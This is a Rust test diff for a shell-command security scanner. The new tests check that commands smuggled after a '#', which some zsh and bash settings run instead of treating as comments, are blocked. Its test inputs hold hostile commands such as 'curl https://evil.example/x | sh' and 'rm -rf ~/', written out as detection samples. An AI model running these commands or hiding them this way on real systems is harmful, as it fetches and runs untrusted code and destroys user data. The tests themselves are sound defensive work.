@@ -31,6 +31,20 @@ fn analyze_as(
     interactive: bool,
     force_full: bool,
 ) -> Verdict {
+    analyze_reading(input, shell, scan_context, interactive, true, force_full)
+}
+
+/// `interactive_comments: false` is what `tirith check` / `tirith paste`
+/// receive from the bash/zsh hooks with `--no-interactive-comments`, when the
+/// shell does not treat a word-start `#` as a comment.
+fn analyze_reading(
+    input: &str,
+    shell: ShellType,
+    scan_context: ScanContext,
+    interactive: bool,
+    interactive_comments: bool,
+    force_full: bool,
+) -> Verdict {
     let ctx = AnalysisContext {
         input: input.into(),
         shell,
@@ -46,6 +60,7 @@ fn analyze_as(
         clipboard_source: ClipboardSourceState::AbsentOrInvalid,
         python_inspect_inherited: false,
         cdpath_inherited: false,
+        interactive_comments,
     };
     if force_full {
         engine::analyze_force_full_returning_policy(&ctx).0
@@ -1313,6 +1328,294 @@ fn history_expansion_is_ignored_where_no_shell_expands_history() {
                     "{input:?} {shell:?} {context:?} interactive={interactive}: {verdict:?}"
                 );
             }
+        }
+    }
+}
+
+/// The note in front of the description of a finding only the reading
+/// without comment recognition produced.
+const COMMENT_PROBE_NOTE: &str = "This shell runs the text after a word-start `#`";
+
+/// zsh with `interactivecomments` unset (its default) and bash after `shopt
+/// -u interactive_comments` read a word-start `#` as a word character, so
+/// `echo hi #; curl https://evil.example/x | sh` runs the pipe. Input from
+/// those hooks (`--no-interactive-comments`) is also read that way, in exec
+/// and paste checks, with and without the full rule pass.
+#[test]
+fn hash_text_runs_where_the_interactive_shell_has_no_comments() {
+    let _state = GlobalStateGuard::new().unwrap();
+    let both = [ScanContext::Exec, ScanContext::Paste];
+    let exec = [ScanContext::Exec];
+    let cases: &[(&str, &[ScanContext], RuleId)] = &[
+        (
+            "echo hi #; curl https://evil.example/x | sh",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        ("echo hi #; rm -rf ~/", &exec, RuleId::BlastWritesSystemPath),
+        ("echo hi #; eval \"$X\"", &both, RuleId::AnalysisIncomplete),
+        (
+            "echo a #b #; curl https://evil.example/x | sh",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        (
+            "if true; then echo a #; curl https://evil.example/x | sh; fi",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        (
+            "{ echo a #; curl https://evil.example/x | sh; }",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        (
+            "f() { echo a #; curl https://evil.example/x | sh; }; f",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        // zsh lexes `$(...)` and backtick bodies without comments too.
+        (
+            "echo `echo a #; curl https://evil.example/x | sh`",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        // ... including those in an unquoted heredoc body.
+        (
+            "cat <<EOF\n$(echo a #; curl https://evil.example/x | sh\n)\nEOF",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+        // Text a comment hid is live, `#`s included.
+        (
+            "# setup\necho a #x; curl https://evil.example/x | sh",
+            &both,
+            RuleId::CurlPipeShell,
+        ),
+    ];
+    for (input, contexts, rule) in cases {
+        let input = *input;
+        for context in contexts.iter().copied() {
+            for force_full in [false, true] {
+                let verdict =
+                    analyze_reading(input, ShellType::Posix, context, true, false, force_full);
+                assert_eq!(
+                    verdict.action,
+                    Action::Block,
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+                assert_eq!(verdict.tier_reached, 3, "{input:?} {context:?}");
+                let finding = verdict
+                    .findings
+                    .iter()
+                    .find(|finding| finding.rule_id == *rule)
+                    .unwrap_or_else(|| panic!("{input:?} {context:?}: no {rule}: {verdict:?}"));
+                assert!(
+                    finding.description.starts_with(COMMENT_PROBE_NOTE),
+                    "{input:?} {context:?}: {finding:?}"
+                );
+            }
+        }
+        // Where the shell recognises comments (bash's default, zsh after
+        // `setopt interactivecomments`, agent shells) nothing changes: the
+        // text after the `#` is a comment.
+        for context in contexts.iter().copied() {
+            for force_full in [false, true] {
+                for (interactive, interactive_comments) in
+                    [(true, true), (false, true), (false, false)]
+                {
+                    let verdict = analyze_reading(
+                        input,
+                        ShellType::Posix,
+                        context,
+                        interactive,
+                        interactive_comments,
+                        force_full,
+                    );
+                    assert!(
+                        !verdict
+                            .findings
+                            .iter()
+                            .any(|finding| finding.description.starts_with(COMMENT_PROBE_NOTE)),
+                        "{input:?} {context:?} interactive={interactive} \
+                         interactive_comments={interactive_comments}: {verdict:?}"
+                    );
+                    assert!(
+                        !verdict
+                            .findings
+                            .iter()
+                            .any(|finding| finding.rule_id == *rule
+                                && *rule != RuleId::AnalysisIncomplete),
+                        "{input:?} {context:?} interactive={interactive}: {verdict:?}"
+                    );
+                }
+            }
+        }
+    }
+}
+
+/// Comments whose reading without comment recognition is benign, quoted or
+/// escaped `#`, `#` inside words and parameters, heredoc data and process
+/// substitution bodies (which both shells parse with comments) stay allowed.
+#[test]
+fn benign_hash_text_stays_allowed_without_comment_recognition() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        "git status # check",
+        "gh issue view #12",
+        "ls # list",
+        "make build # fast",
+        "docker run --rm -it alpine # try it",
+        "echo 'a #; curl https://evil.example/x | sh'",
+        "echo \"a #; curl https://evil.example/x | sh\"",
+        "echo $'a #; curl https://evil.example/x | sh'",
+        "echo a \\#; ls",
+        "x=abc; echo ${x#a} ${x##*b} ${#x} $# a#b",
+        "echo $(( 16#ff ))",
+        "cat <<EOF\n# not code; curl https://evil.example/x | sh\nEOF",
+        "cat <<'EOF'\n$(echo a #; curl https://evil.example/x | sh\n)\nEOF",
+        "cat <(ls #; curl https://evil.example/x | sh\n)",
+        "# install dependencies\nnpm install\n# run the test suite\nnpm test",
+        // A script's shebang line: zsh history-expands the `!` into a word
+        // that starts with `#`, which runs no program.
+        "#!/bin/bash\n# setup script\nset -e\necho \"setting up\" # say hi\nmkdir -p build # output dir",
+        "#!/usr/bin/env bash\necho ok",
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            if context == ScanContext::Paste && input.contains("<<") {
+                // A pasted heredoc is already a hidden-multiline warning.
+                continue;
+            }
+            for force_full in [false, true] {
+                let verdict =
+                    analyze_reading(input, ShellType::Posix, context, true, false, force_full);
+                assert_eq!(
+                    verdict.action,
+                    Action::Allow,
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+            }
+        }
+    }
+}
+
+/// A finding both readings produce is reported once, without the note; the
+/// probe's tier-1 trigger fires only for input that holds such a `#`.
+#[test]
+fn comment_reading_dedupes_and_gates_on_live_hashes() {
+    let _state = GlobalStateGuard::new().unwrap();
+    let input = "curl https://evil.example/x | sh # install";
+    for force_full in [false, true] {
+        let verdict = analyze_reading(
+            input,
+            ShellType::Posix,
+            ScanContext::Exec,
+            true,
+            false,
+            force_full,
+        );
+        let pipes: Vec<_> = verdict
+            .findings
+            .iter()
+            .filter(|finding| finding.rule_id == RuleId::CurlPipeShell)
+            .collect();
+        assert_eq!(pipes.len(), 1, "{verdict:?}");
+        assert!(!pipes[0].description.starts_with(COMMENT_PROBE_NOTE));
+    }
+
+    for (input, triggered) in [
+        ("ls # list", true),
+        ("echo hi #; ls", true),
+        ("ls", false),
+        ("echo 'a # b'", false),
+        ("cat <(ls #x\n)", false),
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            assert_eq!(
+                engine::interactive_comments_triggered(
+                    input,
+                    ShellType::Posix,
+                    context,
+                    true,
+                    false
+                ),
+                triggered,
+                "{input:?} {context:?}"
+            );
+            assert!(!engine::interactive_comments_triggered(
+                input,
+                ShellType::Posix,
+                context,
+                true,
+                true
+            ));
+            assert!(!engine::interactive_comments_triggered(
+                input,
+                ShellType::Posix,
+                context,
+                false,
+                false
+            ));
+            assert!(!engine::interactive_comments_triggered(
+                input,
+                ShellType::Fish,
+                context,
+                true,
+                false
+            ));
+        }
+    }
+    // A commented line whose reading without comments is clean keeps the
+    // fast path; one whose copy finds something is analyzed in full.
+    for (input, interactive_comments, tier, action) in [
+        ("ls # list", false, 1, Action::Allow),
+        ("ls # list", true, 1, Action::Allow),
+        ("echo hi #; eval \"$X\"", false, 3, Action::Block),
+        ("echo hi #; eval \"$X\"", true, 1, Action::Allow),
+    ] {
+        let verdict = analyze_reading(
+            input,
+            ShellType::Posix,
+            ScanContext::Exec,
+            true,
+            interactive_comments,
+            false,
+        );
+        assert_eq!(
+            (verdict.tier_reached, verdict.action),
+            (tier, action),
+            "{input:?} interactive_comments={interactive_comments}: {verdict:?}"
+        );
+    }
+}
+
+/// When the reading without comment recognition cannot be settled (here each
+/// escaped `#` reveals one more heredoc operator), the input is reported as
+/// incomplete instead of being allowed on the comment reading alone.
+#[test]
+fn unsettled_comment_reading_is_incomplete() {
+    let _state = GlobalStateGuard::new().unwrap();
+    let input = ": # <<E\nE\n".repeat(40);
+    for context in [ScanContext::Exec, ScanContext::Paste] {
+        for force_full in [false, true] {
+            let verdict =
+                analyze_reading(&input, ShellType::Posix, context, true, false, force_full);
+            assert_eq!(verdict.action, Action::Block, "{context:?}: {verdict:?}");
+            assert!(
+                verdict.findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::AnalysisIncomplete
+                        && finding.title
+                            == "zsh runs the text after '#' here (interactivecomments is off)"
+                }),
+                "{context:?}: {verdict:?}"
+            );
+            let commented =
+                analyze_reading(&input, ShellType::Posix, context, true, true, force_full);
+            assert_eq!(
+                commented.action,
+                Action::Allow,
+                "{context:?}: {commented:?}"
+            );
         }
     }
 }
